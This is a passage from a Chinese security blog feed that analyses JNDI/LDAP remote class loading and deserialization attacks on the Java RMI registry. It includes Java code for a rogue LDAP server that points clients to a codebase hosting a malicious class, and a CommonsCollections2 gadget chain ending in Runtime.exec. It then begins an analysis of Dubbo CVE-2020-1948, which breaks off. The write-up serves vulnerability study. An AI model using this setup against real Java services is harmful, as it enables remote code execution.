class="token punctuation">,</span>                    SocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>SSLSocketFactory<span class="token punctuation">)</span> SSLSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setSchema</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setEnforceAttributeSyntaxCompliance</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setEnforceSingleStructuralObjectClass</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//向ldap服务中添加数据条目，具体ldap条目相关细节可以去学习ldap相关知识，这里就不做详细讲解了</span>            InMemoryDirectoryServer ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"dn: "</span> <span class="token operator">+</span> <span class="token string">"dc=example,dc=com"</span><span class="token punctuation">,</span> <span class="token string">"objectClass: top"</span><span class="token punctuation">,</span> <span class="token string">"objectclass: domain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"dn: "</span> <span class="token operator">+</span> <span class="token string">"ou=employees,dc=example,dc=com"</span><span class="token punctuation">,</span> <span class="token string">"objectClass: organizationalUnit"</span><span class="token punctuation">,</span> <span class="token string">"objectClass: top"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"dn: "</span> <span class="token operator">+</span> <span class="token string">"uid=longofo,ou=employees,dc=example,dc=com"</span><span class="token punctuation">,</span> <span class="token string">"objectClass: ExportObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Listening on 0.0.0.0:"</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以上的代码呢就是在本地起了一个ldap服务监听1389端口，并向其中添加了一条可被查询的条目。单起一个ldap服务肯定是不够的，既然是ldap RCE攻击向量，那就肯定要添加一些东西让 客户端在通过JNDI查询该Ldap的条目之后转而去指定的服务器上加载恶意类。</p><p>所以需要向该条目中添加一些属性，根据知道创宇404实验室的Longofo大佬的文章</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>        Hashtable env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span>                <span class="token string">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"ldap://localhost:1389"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DirContext ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialDirContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        Attribute mod1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"objectClass"</span><span class="token punctuation">,</span> <span class="token string">"top"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mod1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"javaNamingReference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Attribute mod2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaCodebase"</span><span class="token punctuation">,</span>                <span class="token string">"http://127.0.0.1:8000/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Attribute mod3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span>                <span class="token string">"ExportObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Attribute mod4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaFactory"</span><span class="token punctuation">,</span> <span class="token string">"com.longofo.remoteclass.ExportObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ModificationItem<span class="token punctuation">[</span><span class="token punctuation">]</span> mods <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod1<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod2<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod3<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod4<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">modifyAttributes</span><span class="token punctuation">(</span><span class="token string">"uid=longofo,ou=employees,dc=example,dc=com"</span><span class="token punctuation">,</span> mods<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里是向之前创建好的ldap索引中添加一些属性，客户端在向服务端查询该条索引，服务端返回查询结果，客户端根据服务端的返回结果然后去指定位置查找并加载恶意类，这就是ldap攻击向量一次RCE攻击的流程。</p><p>这里我们就要具体关注下JNDI客户端是如何在访问Ldap服务的时候被RCE的</p><p>首先客户端代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPClient1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object object <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>lookup函数开始一直往下执行，执行到LdapCtx.c_lookup方法时，发送查询信息到服务端并解析服务端的返回数据</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> Object <span class="token function">c_lookup</span><span class="token punctuation">(</span>Name var1<span class="token punctuation">,</span> Continuation var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    var2<span class="token punctuation">.</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    Object var3 <span class="token operator">=</span> null<span class="token punctuation">;</span>    Object var4<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        SearchControls var22 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SearchControls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var22<span class="token punctuation">.</span><span class="token function">setSearchScope</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var22<span class="token punctuation">.</span><span class="token function">setReturningAttributes</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        var22<span class="token punctuation">.</span><span class="token function">setReturningObjFlag</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//此处客户端向服务端进行查询并获得查询结果</span>        LdapResult var23 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doSearchOnce</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token string">"(objectClass=*)"</span><span class="token punctuation">,</span> var22<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>respCtls <span class="token operator">=</span> var23<span class="token punctuation">.</span>resControls<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var23<span class="token punctuation">.</span>status <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">processReturnCode</span><span class="token punctuation">(</span>var23<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var23<span class="token punctuation">.</span>entries <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> var23<span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            LdapEntry var25 <span class="token operator">=</span> <span class="token punctuation">(</span>LdapEntry<span class="token punctuation">)</span>var23<span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">elementAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var4 <span class="token operator">=</span> var25<span class="token punctuation">.</span>attributes<span class="token punctuation">;</span>            Vector var8 <span class="token operator">=</span> var25<span class="token punctuation">.</span>respCtls<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var8 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">appendVector</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>respCtls<span class="token punctuation">,</span> var8<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttributes</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Obj<span class="token punctuation">.</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//将查询的结果，也就是我们在server端所添加的那几条属性进行解析，并返回一个Reference对象  </span>          var3 <span class="token operator">=</span> Obj<span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//此后的操作就和rmi Reference一样的通过实例化URLClassloader对像，根据Reference中的信息去远程加载恶意类</span>        <span class="token keyword">return</span> DirectoryManager<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>envprops<span class="token punctuation">,</span> <span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>关键点在于<code>var3 = Obj.decodeObject((Attributes)var4)</code>这行代码解析完成后所返回的结果，如下图所示</p><p>![image-20200922161931677](个人学习过程中对RMI JRMP 以及JNDI的一些理解/image-20200922161931677.png)</p><p>然后在<code>DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4)</code>这行代码中根据Reference中的信息 实例化URLClassloader去远程加载恶意类。</p><p>这种方法一直到jdk 8u191之前的版本都是可用的，但是在之后的版本中同 JNDI rmi Reference一样，添加了对<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的校验，该值默认为false</p><h2 id="服务端攻击rmiregistry"><a href="#服务端攻击rmiregistry" class="headerlink" title="服务端攻击rmiregistry"></a>服务端攻击rmiregistry</h2><p>接下来我们就要讲通过服务端来攻击rmiregistry了，和客户端服务端互相攻击的方式比起来相对复杂那么一些，确切的说是通过伪造一个服务端的形式，因为之前说这rmiregistry通常都和真正的服务端出在同一个主机，同一个项目上，根据我们之前对RMI流程的分析，服务端在通过bind方法向rmiregistry绑定远程方法信息时，rmiregistry会反序列化服务端传来的数据，在rmiregistry方处理服务端传来的数据时会调用用RegistryImpl_Skel的dispatch方法，其中会反序列化服务端传来的两个信息，一个是远程方法提供服务的注册名，另一个是封装有远程方法提供服务方信息的Proxy对象。</p><pre class=" language-java"><code class="language-java">          <span class="token comment" spellcheck="true">//获取输入流</span>        var9 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//反序列化“hello”字符串</span>        var7 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//这个位置本来是属于反序列化出来的“HelloImpl”对象的，但是最终结果得到的是一个Proxy对像</span>          <span class="token comment" spellcheck="true">//这个很关键，这个Proxy对象即所为的Stub(存根)，客户端就是通过这个Stub来知道服务端的地址和端口号从                               而进行通信的。</span>          <span class="token comment" spellcheck="true">//这里的反序列化点很明显是我们可以利用的，通过RMI服务端执行bind，我们就可以攻击rmiregistry注                 册中心，导致其反序列化RCE</span>        var80 <span class="token operator">=</span> <span class="token punctuation">(</span>Remote<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>第一个String类型的数据反序列化我们没有利用的思路，因为String是一个final类型，没办法继承和实现，我们入手的点就只能是下面的那个 <code>var80 = (Remote)var9.readObject();</code>之前分析RMI流程代码时有一个点没有提到，就是bind方法在序列化一个远程对象时会将转化成一个proxy对象然后再进行序列化操作并传输给rmiregistry，序列化的proxy对像默认是实现Remot接口并封装RemoteObjectInvocationHandler的，但是如果传递的远程对象本身就是Proxy则不会进行任何转化直接传递，由MarshalOutputStream对象的replaceObject方法来实现具体操作，代码如下。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> Object <span class="token function">replaceObject</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token keyword">instanceof</span> <span class="token class-name">Remote</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var1 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteStub</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Target var2 <span class="token operator">=</span> ObjectTable<span class="token punctuation">.</span><span class="token function">getTarget</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Remote<span class="token punctuation">)</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//生成一个Target对象，其中有一个stub属性就是转化好的Proxy对象</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var2<span class="token punctuation">.</span><span class="token function">getStub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回Proxy对象</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> var1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>那么这样以来，似乎攻击的思路就突然清晰了，我们只需要找一个rmiregistry中可以利用的Gadget然后，ysoserial中的RMIRegistryExploit就是针对使用了版本低于JDK8u121的rmiregistry进行反序列化攻击的一个工具。</p><p>此次的测试环境是jdk1.7_21，采用CommonCollection2作为payload来进行尝试和分析。由于CommonCollection2封装的过程中用到了</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span></code></pre><p>所以在rmiregistry这边将commons-collections4引入</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>然后展示一下服务端这边最终封装完后的一个Proxy，服务端将这个Proxy序列化后 传递给rmiregistry，然后rmiregistry反序列化该数据从而出发漏洞执行命令</p><p>![image-20200728143909096](个人学习过程中对RMI JRMP 以及JNDI的一些理解/25.png)</p><p>最终的调用链简化一下，如下所示</p><pre class=" language-java"><code class="language-java">AnnotationInvocationHandler<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>HashMap<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>PriorityQueue<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>PriorityQueue<span class="token punctuation">.</span><span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span>PriorityQueue<span class="token punctuation">.</span><span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> PriorityQueue<span class="token punctuation">.</span><span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span>TransformingComparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span>InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>TemplatesImpl<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>TemplatesImpl<span class="token punctuation">.</span><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>具体的反序列化过程就不做分析了</p><p>但是要注意一点就是jdk 8u121版本以后，在rmiregistry创建时不是有这么一段代码么 <code>this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter));</code> 传入了<code>RegistryImpl::registryFilter</code>作为参数，所以在rmiregistry这边反序列化服务端传递来的Proxy对象时，是会进行对象的白名单校验的，只有以下对像才能进行反序列化</p><pre class=" language-java"><code class="language-java">String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span></code></pre><p>但是我们在构造恶意类的时候使用的是CommonCollection2，registryFilter在反序列化完最外面的proxy对象后第二要要反序列化的就是AnnotationInvocationHandler，而AnnotationInvocationHandler根本就不在上面的白名单里所以自然会抛出异常</p><pre class=" language-java"><code class="language-java">ObjectInputFilter REJECTED<span class="token operator">:</span> <span class="token keyword">class</span> <span class="token class-name">sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>AnnotationInvocationHandler</span></code></pre><p>这个白名单过滤机制也就是所谓的 JEP290，在使用了该机制以后，ysoserial中所有的gaget几乎都不可用了,需要想办法绕过这个白名单才行。</p><h2 id="客户端攻击rmiregistry"><a href="#客户端攻击rmiregistry" class="headerlink" title="客户端攻击rmiregistry"></a>客户端攻击rmiregistry</h2><p>暂无</p><h2 id="rmiregistry攻击客户端"><a href="#rmiregistry攻击客户端" class="headerlink" title="rmiregistry攻击客户端"></a>rmiregistry攻击客户端</h2><p>暂无</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a></p><p><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">https://xz.aliyun.com/t/7264</a></p><p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a></p><h2 id><a href="#" class="headerlink" title></a></h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
            <tag> RMI </tag>
            
            <tag> JNDI </tag>
            
            <tag> RPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞及其补丁绕过深度分析</title>
      <link href="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/"/>
      <url>/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-dubbo-CVE-2020-1948-反序列化远程代码执行漏洞及其补丁绕过深度分析"><a href="#Apache-dubbo-CVE-2020-1948-反序列化远程代码执行漏洞及其补丁绕过深度分析" class="headerlink" title="Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞及其补丁绕过深度分析"></a>Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞及其补丁绕过深度分析</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Apache-Dubbo简介"><a href="#Apache-Dubbo简介" class="headerlink" title="Apache Dubbo简介"></a>Apache Dubbo简介</h2><p>Dubbo是一个分布式服务框架，致力于提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。简单的说，dubbo就是个服务框架，如果没有分布式的需求，其实是不需要用的，只有在分布式的时候，才有dubbo这样的分布式服务框架的需求，并且本质上是个服务调用的东东，说白了就是个远程服务调用的分布式框架（告别Web Service模式中的WSdl，以服务者与消费者的方式在dubbo上注册）<br>其核心部分包含:</p><ul><li>远程通讯: 提供对多种基于长连接的NIO框架抽象封装，包括多种线程模型，序列化，以及“请求-响应”模式的信息交换方式。</li><li>集群容错: 提供基于接口方法的透明远程过程调用，包括多协议支持，以及软负载均衡，失败容错，地址路由，动态配置等集群支持。</li><li>自动发现: 基于注册中心目录服务，使服务消费方能动态的查找服务提供方，使地址透明，使服务提供方可以平滑增加或减少机器。</li></ul><p>下图是来自Apache dubbo 官网的工作流程和原理</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/1.png" 